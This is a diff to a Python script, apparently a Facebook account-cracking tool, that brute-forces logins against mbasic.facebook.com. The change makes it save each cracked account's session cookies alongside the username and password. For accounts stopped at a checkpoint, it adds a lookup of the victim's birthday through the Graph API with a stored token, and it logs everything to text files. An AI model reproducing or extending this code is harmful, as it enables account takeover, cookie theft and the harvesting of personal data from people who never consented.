@@ -87,19 +87,41 @@ class __crack__:
             pw = pw.lower()
             ngUA = 'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45'
             ses = requests.Session()
-            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ngUA,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
-                wrt = '%s|%s' % (user,pw)
+            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                wrt = '%s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('ok.txt','a').write('%s\n' % wrt)
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
+                try:
+                    kontol = open('login.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    month, day, year = cp_ttl.split('/')
+                    month = bulan_ttl[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(wrt)
+                    open('cp.txt','a').write('%s\n' % wrt)
+                    open('checkcp.txt', 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day   = ''
+                    year  = ''
+                except:
+                    pass
+
+                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('cp.txt', 'a').write('%s\n' % wrt)
+                open('checkcp.txt', 'a').write('%s\n' % wrt)
                 break
                 continue
 
